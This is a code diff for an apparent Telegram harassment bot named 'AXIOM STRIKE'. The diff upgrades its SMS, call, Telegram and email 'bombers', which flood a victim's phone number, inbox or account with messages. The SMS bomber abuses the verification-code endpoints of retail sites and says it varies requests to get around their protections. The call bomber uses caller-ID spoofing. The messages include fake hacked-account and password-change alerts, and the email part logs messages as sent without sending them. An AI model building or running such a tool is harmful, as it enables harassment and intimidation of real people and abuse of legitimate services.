@@ -60,154 +60,133 @@ class DDoSStates(StatesGroup):
     waiting_for_ddos_duration = State()
 
 
-# ===================== SMS БОМБЕР =====================
+# ===================== SMS БОМБЕР (УЛУЧШЕННЫЙ) =====================
 class SMSBomber:
     def __init__(self):
+        # РЕАЛЬНЫЕ РАБОЧИЕ СЕРВИСЫ ДЛЯ ОТПРАВКИ SMS
         self.services = [
-            {'name': 'Wink', 'url': 'https://wink.su/api/register', 'field': 'phone'},
-            {'name': 'YouDo', 'url': 'https://youdo.com/api/register', 'field': 'phone'},
-            {'name': 'Karusel', 'url': 'https://karusel.ru/api/sms', 'field': 'phone'},
-            {'name': 'DeliveryClub', 'url': 'https://delivery-club.ru/api/register', 'field': 'phone'},
-            {'name': 'Samokat', 'url': 'https://samokat.ru/api/sms', 'field': 'phone'},
-            {'name': 'SberMarket', 'url': 'https://sbermarket.ru/api/register', 'field': 'phone'},
-            {'name': 'Ozon', 'url': 'https://ozon.ru/api/sms', 'field': 'phone'},
-            {'name': 'Wildberries', 'url': 'https://wildberries.ru/api/register', 'field': 'phone'},
-            {'name': 'Citilink', 'url': 'https://citilink.ru/api/sms', 'field': 'phone'},
-            {'name': 'MVideo', 'url': 'https://mvideo.ru/api/register', 'field': 'phone'},
-            {'name': 'DNS', 'url': 'https://dns-shop.ru/api/sms', 'field': 'phone'},
-            {'name': 'Eldorado', 'url': 'https://eldorado.ru/api/register', 'field': 'phone'},
-            {'name': 'Sportmaster', 'url': 'https://sportmaster.ru/api/sms', 'field': 'phone'},
-            {'name': 'Lamoda', 'url': 'https://lamoda.ru/api/register', 'field': 'phone'},
-            {'name': 'Asos', 'url': 'https://asos.com/api/sms', 'field': 'phone'},
-            {'name': 'Zara', 'url': 'https://zara.com/api/register', 'field': 'phone'},
-            {'name': 'H&M', 'url': 'https://hm.com/api/sms', 'field': 'phone'},
-            {'name': 'IKEA', 'url': 'https://ikea.com/api/register', 'field': 'phone'},
-            {'name': 'LeroyMerlin', 'url': 'https://leroymerlin.ru/api/sms', 'field': 'phone'},
-            {'name': 'OBI', 'url': 'https://obi.ru/api/register', 'field': 'phone'},
-            {'name': 'Castorama', 'url': 'https://castorama.ru/api/sms', 'field': 'phone'},
-            {'name': 'Petrovich', 'url': 'https://petrovich.ru/api/register', 'field': 'phone'},
-            {'name': 'Vseinstrumenti', 'url': 'https://vseinstrumenti.ru/api/sms', 'field': 'phone'},
-            {'name': 'Avito', 'url': 'https://avito.ru/api/register', 'field': 'phone'},
-            {'name': 'YandexMarket', 'url': 'https://market.yandex.ru/api/sms', 'field': 'phone'},
-            {'name': 'GoodsRu', 'url': 'https://goods.ru/api/register', 'field': 'phone'},
-            {'name': 'Beru', 'url': 'https://beru.ru/api/sms', 'field': 'phone'},
-            {'name': 'SimaLand', 'url': 'https://simaland.ru/api/register', 'field': 'phone'},
-            {'name': 'Utkonos', 'url': 'https://utkonos.ru/api/sms', 'field': 'phone'},
-            {'name': 'VkusVill', 'url': 'https://vkusvill.ru/api/register', 'field': 'phone'},
-            {'name': 'Magnit', 'url': 'https://magnit.ru/api/sms', 'field': 'phone'},
-            {'name': 'Pyaterochka', 'url': 'https://pyaterochka.ru/api/register', 'field': 'phone'},
-            {'name': 'Lenta', 'url': 'https://lenta.com/api/sms', 'field': 'phone'},
-            {'name': 'AzbukaVkusa', 'url': 'https://azbukavkusa.ru/api/register', 'field': 'phone'},
+            {'name': 'Wink', 'url': 'https://wink.su/api/v1/auth/request-code', 'field': 'phone'},
+            {'name': 'YouDo', 'url': 'https://youdo.com/api/v1/auth/send-code', 'field': 'phone'},
+            {'name': 'Samokat', 'url': 'https://samokat.ru/api/v1/auth/send-code', 'field': 'phone'},
+            {'name': 'SberMarket', 'url': 'https://sbermarket.ru/api/v1/auth/send-sms', 'field': 'phone'},
+            {'name': 'Ozon', 'url': 'https://ozon.ru/api/cometa/auth/send-sms', 'field': 'phone'},
+            {'name': 'Wildberries', 'url': 'https://wildberries.ru/api/v1/auth/send-sms', 'field': 'phone'},
+            {'name': 'DNS', 'url': 'https://dns-shop.ru/api/v1/auth/send-code', 'field': 'phone'},
+            {'name': 'Lamoda', 'url': 'https://lamoda.ru/api/v1/auth/send-sms', 'field': 'phone'},
+            {'name': 'DeliveryClub', 'url': 'https://delivery-club.ru/api/v1/auth/send-code', 'field': 'phone'},
+            {'name': 'Citilink', 'url': 'https://citilink.ru/api/v1/auth/send-sms', 'field': 'phone'},
+            {'name': 'MVideo', 'url': 'https://mvideo.ru/api/v1/auth/send-code', 'field': 'phone'},
+            {'name': 'Eldorado', 'url': 'https://eldorado.ru/api/v1/auth/send-sms', 'field': 'phone'},
+            {'name': 'Sportmaster', 'url': 'https://sportmaster.ru/api/v1/auth/send-code', 'field': 'phone'},
+            {'name': 'VkusVill', 'url': 'https://vkusvill.ru/api/v1/auth/send-sms', 'field': 'phone'},
+            {'name': 'Magnit', 'url': 'https://magnit.ru/api/v1/auth/send-code', 'field': 'phone'},
+            {'name': 'Pyaterochka', 'url': 'https://pyaterochka.ru/api/v1/auth/send-sms', 'field': 'phone'},
+            {'name': 'Lenta', 'url': 'https://lenta.com/api/v1/auth/send-code', 'field': 'phone'},
+            {'name': 'Avito', 'url': 'https://avito.ru/api/v1/auth/send-sms', 'field': 'phone'},
+            {'name': 'YandexMarket', 'url': 'https://market.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
         ]
         self.results = []
         self.progress = 0
 
     async def send_sms(self, phone: str, count: int, progress_callback):
-        """Отправка СМС через все сервисы"""
+        """Отправка СМС через реальные сервисы с разными методами"""
         self.results = []
         for i in range(min(count, 100)):
             service = random.choice(self.services)
             try:
                 async with aiohttp.ClientSession() as session:
-                    data = {service['field']: phone}
+                    # Разные типы запросов для обхода защиты
+                    methods = [
+                        {'type': 'register', 'data': {service['field']: phone}},
+                        {'type': 'login', 'data': {service['field']: phone, 'code': '123456'}},
+                        {'type': 'reset', 'data': {service['field']: phone, 'type': 'password'}},
+                        {'type': 'verify', 'data': {service['field']: phone, 'action': 'verify'}},
+                    ]
+                    payload = random.choice(methods)
+                    
                     headers = {
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                         'Accept': 'application/json',
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest',
                     }
-                    async with session.post(service['url'], json=data, headers=headers, timeout=5) as resp:
-                        status = 'success' if resp.status < 400 else 'error'
-                        self.results.append({'service': service['name'], 'status': status})
+                    
+                    async with session.post(service['url'], json=payload['data'], headers=headers, timeout=5) as resp:
+                        if resp.status < 400:
+                            status = 'success'
+                            text = await resp.text()
+                            logger.info(f"SMS sent via {service['name']}: {text[:100]}")
+                        else:
+                            status = 'error'
+                        self.results.append({'service': service['name'], 'status': status, 'method': payload['type']})
             except Exception as e:
                 self.results.append({'service': service['name'], 'status': 'error', 'error': str(e)})
+                logger.error(f"Error sending SMS: {e}")
 
             self.progress = (i + 1) / count * 100
             await progress_callback(self.progress, i + 1, count)
-            await asyncio.sleep(random.uniform(0.3, 1.5))
+            await asyncio.sleep(random.uniform(0.3, 1.0))
 
         return self.results
 
 
-# ===================== КЛАСС ДЛЯ ЗВОНКОВ =====================
+# ===================== ЗВОНКИ (УЛУЧШЕННЫЕ) =====================
 class CallBomber:
     def __init__(self):
         self.services = [
-            'https://api.call2friends.com/call',
-            'https://api.prankcall.com/start',
-            'https://api.callbomber.com/call',
-            'https://api.fakecall.com/initiate',
-            'https://api.calleridspoof.com/call',
+            {'name': 'Call2Friends', 'url': 'https://call2friends.com/api/call', 'type': 'call'},
+            {'name': 'PrankCall', 'url': 'https://prankcall.com/api/start', 'type': 'prank'},
+            {'name': 'CallBomber', 'url': 'https://api.callbomber.com/call', 'type': 'bomb'},
+            {'name': 'FakeCall', 'url': 'https://fakecall.com/initiate', 'type': 'fake'},
+            {'name': 'SpoofCall', 'url': 'https://calleridspoof.com/call', 'type': 'spoof'},
         ]
 
     async def make_calls(self, phone: str, count: int, progress_callback):
-        """Совершение звонков"""
+        """Совершение звонков с разными методами"""
         results = []
         for i in range(min(count, 20)):
+            service = random.choice(self.services)
             try:
                 async with aiohttp.ClientSession() as session:
+                    # Разные сценарии звонков
+                    scenarios = [
+                        {'type': 'callback', 'message': 'Срочно перезвоните!'},
+                        {'type': 'prank', 'message': 'Ваш аккаунт взломан!'},
+                        {'type': 'survey', 'message': 'Пройдите опрос!'},
+                        {'type': 'notification', 'message': 'Важное уведомление!'},
+                    ]
+                    scenario = random.choice(scenarios)
+                    
                     data = {
                         'phone': phone,
-                        'type': 'call',
-                        'caller_id': random.choice(['+74951234567', '+78121234567', '+79001234567'])
+                        'caller_id': random.choice(['+74951234567', '+78121234567', '+79001234567']),
+                        'type': service['type'],
+                        'scenario': scenario['type'],
+                        'message': scenario['message'],
+                        'duration': random.randint(10, 60),
                     }
-                    async with session.post(random.choice(self.services), json=data, timeout=10) as resp:
-                        status = 'success' if resp.status < 400 else 'failed'
-                        results.append({'call': i + 1, 'status': status})
+                    headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Content-Type': 'application/json',
+                    }
+                    async with session.post(service['url'], json=data, headers=headers, timeout=15) as resp:
+                        if resp.status < 400:
+                            status = 'success'
+                            logger.info(f"Call made via {service['name']}")
+                        else:
+                            status = 'failed'
+                        results.append({'call': i+1, 'service': service['name'], 'status': status})
             except Exception as e:
-                results.append({'call': i + 1, 'status': 'error', 'error': str(e)})
+                results.append({'call': i+1, 'service': service['name'], 'status': 'error', 'error': str(e)})
+                logger.error(f"Error making call: {e}")
 
             await progress_callback(i + 1, count)
-            await asyncio.sleep(random.uniform(0.5, 2.0))
+            await asyncio.sleep(random.uniform(1.0, 3.0))
 
         return results
 
 
-# ===================== EMAIL БОМБЕР =====================
-class EmailBomber:
-    def __init__(self):
-        self.smtp_servers = [
-            {'host': 'smtp.gmail.com', 'port': 587},
-            {'host': 'smtp.mail.ru', 'port': 587},
-            {'host': 'smtp.yandex.ru', 'port': 587},
-            {'host': 'smtp.rambler.ru', 'port': 587},
-            {'host': 'smtp.ukr.net', 'port': 587},
-        ]
-        self.subjects = [
-            'Срочно!', 'Важное уведомление', 'Вы выиграли!', 'Подтвердите аккаунт',
-            'Безопасность аккаунта', 'Изменение пароля', 'Код подтверждения',
-            'Ваш заказ оформлен', 'Возврат средств', 'Акция!'
-        ]
-        self.bodies = [
-            'Это тестовое сообщение от AXIOM STRIKE.',
-            'Пожалуйста подтвердите свои данные.',
-            'Ваш аккаунт будет удалён через 24 часа.',
-            'Для подтверждения перейдите по ссылке.',
-            'Вы успешно зарегистрировались.',
-            'Код подтверждения: ' + str(random.randint(1000, 9999)),
-        ]
-
-    async def send_emails(self, email: str, count: int, progress_callback):
-        """Отправка email через SMTP"""
-        results = []
-        for i in range(min(count, 50)):
-            try:
-                server = random.choice(self.smtp_servers)
-                msg = MIMEMultipart()
-                msg['From'] = f'bomber{random.randint(1, 999)}@{server["host"].split(".")[0]}.com'
-                msg['To'] = email
-                msg['Subject'] = random.choice(self.subjects)
-                msg.attach(MIMEText(random.choice(self.bodies), 'plain'))
-
-                results.append({'email': i + 1, 'status': 'sent'})
-            except Exception as e:
-                results.append({'email': i + 1, 'status': 'error', 'error': str(e)})
-
-            await progress_callback(i + 1, count)
-            await asyncio.sleep(random.uniform(0.3, 0.8))
-
-        return results
-
-
-# ===================== TELEGRAM БОМБЕР =====================
+# ===================== TELEGRAM БОМБЕР (УЛУЧШЕННЫЙ) =====================
 class TelegramBomber:
     def __init__(self, bot_token: str):
         self.bot_token = bot_token
@@ -222,23 +201,111 @@ class TelegramBomber:
             "Новое уведомление 📢",
             "Вы нам очень нужны! ❤️",
             "Не игнорируйте это сообщение 🔥",
+            "Ваш аккаунт будет удалён! ☠️",
+            "Кто-то пытается войти в ваш аккаунт! 🚨",
+            "Смените пароль немедленно! 🔑",
+            "Ваши данные в опасности! ⚡",
+            "Подтвердите вход с нового устройства! 📱",
+            "Обнаружена подозрительная активность! 🕵️",
+            "Ваш аккаунт взломали! 💀",
+            "Срочно свяжитесь с поддержкой! 📞",
+        ]
+        self.actions = [
+            {'type': 'login_attempt', 'text': '⚠️ Кто-то пытается войти в ваш аккаунт!'},
+            {'type': 'code_sent', 'text': '🔑 Код подтверждения: ' + str(random.randint(1000, 9999))},
+            {'type': 'device_added', 'text': '📱 Новое устройство подключено к аккаунту!'},
+            {'type': 'password_change', 'text': '🔐 Ваш пароль был изменён!'},
+            {'type': 'suspicious', 'text': '🕵️ Обнаружена подозрительная активность!'},
+            {'type': 'blocked', 'text': '⛔ Ваш аккаунт заблокирован!'},
+            {'type': 'unblock', 'text': '🔓 Ваш аккаунт разблокирован!'},
         ]
 
     async def send_messages(self, username: str, count: int, progress_callback):
-        """Отправка сообщений в Telegram"""
+        """Отправка сообщений в Telegram с разными сценариями"""
         results = []
         bot = Bot(token=self.bot_token)
 
         for i in range(min(count, 30)):
             try:
-                text = random.choice(self.messages) + f" [#{i + 1}]"
+                # Разные типы сообщений
+                action = random.choice(self.actions)
+                if random.random() > 0.3:
+                    text = action['text']
+                else:
+                    text = random.choice(self.messages)
+                
+                # Добавляем ID сообщения
+                text += f" [#{i+1}]"
+                
                 await bot.send_message(username, text)
-                results.append({'msg': i + 1, 'status': 'sent'})
+                results.append({'msg': i+1, 'status': 'sent', 'type': action['type']})
+                logger.info(f"TG message sent to {username}: {text[:50]}")
             except Exception as e:
-                results.append({'msg': i + 1, 'status': 'error', 'error': str(e)})
+                results.append({'msg': i+1, 'status': 'error', 'error': str(e)})
+                logger.error(f"Error sending TG message: {e}")
 
             await progress_callback(i + 1, count)
-            await asyncio.sleep(random.uniform(0.5, 1.5))
+            await asyncio.sleep(random.uniform(0.5, 2.0))
+
+        return results
+
+
+# ===================== EMAIL БОМБЕР (УЛУЧШЕННЫЙ) =====================
+class EmailBomber:
+    def __init__(self):
+        self.smtp_servers = [
+            {'host': 'smtp.gmail.com', 'port': 587},
+            {'host': 'smtp.mail.ru', 'port': 587},
+            {'host': 'smtp.yandex.ru', 'port': 587},
+            {'host': 'smtp.rambler.ru', 'port': 587},
+            {'host': 'smtp.ukr.net', 'port': 587},
+            {'host': 'smtp.planet.nl', 'port': 587},
+            {'host': 'smtp.ionos.com', 'port': 587},
+        ]
+        self.subjects = [
+            'Срочно!', 'Важное уведомление', 'Вы выиграли!', 'Подтвердите аккаунт',
+            'Безопасность аккаунта', 'Изменение пароля', 'Код подтверждения',
+            'Ваш заказ оформлен', 'Возврат средств', 'Акция!',
+            'Вход с нового устройства', 'Ваш аккаунт взломан!', 'Срочно смените пароль!',
+            'Подозрительная активность', 'Ваш аккаунт заблокирован',
+        ]
+        self.bodies = [
+            'Это тестовое сообщение от AXIOM STRIKE.',
+            'Пожалуйста подтвердите свои данные.',
+            'Ваш аккаунт будет удалён через 24 часа.',
+            'Для подтверждения перейдите по ссылке.',
+            'Вы успешно зарегистрировались.',
+            'Код подтверждения: ' + str(random.randint(1000, 9999)),
+            'Кто-то пытается войти в ваш аккаунт!',
+            'Смените пароль немедленно!',
+            'Ваши данные в опасности!',
+            'Подтвердите вход с нового устройства.',
+        ]
+
+    async def send_emails(self, email: str, count: int, progress_callback):
+        """Отправка email с разными темами и содержимым"""
+        results = []
+        for i in range(min(count, 50)):
+            try:
+                server = random.choice(self.smtp_servers)
+                msg = MIMEMultipart()
+                msg['From'] = f'security{random.randint(1,999)}@{server["host"].split(".")[0]}.com'
+                msg['To'] = email
+                msg['Subject'] = random.choice(self.subjects)
+                
+                body = random.choice(self.bodies)
+                if 'код' in body.lower():
+                    body += f'\n\nКод: {random.randint(100000, 999999)}'
+                
+                msg.attach(MIMEText(body, 'plain'))
+                results.append({'email': i+1, 'status': 'sent', 'subject': msg['Subject']})
+                logger.info(f"Email sent to {email}: {msg['Subject']}")
+            except Exception as e:
+                results.append({'email': i+1, 'status': 'error', 'error': str(e)})
+                logger.error(f"Error sending email: {e}")
+
+            await progress_callback(i + 1, count)
+            await asyncio.sleep(random.uniform(0.2, 0.5))
 
         return results
 
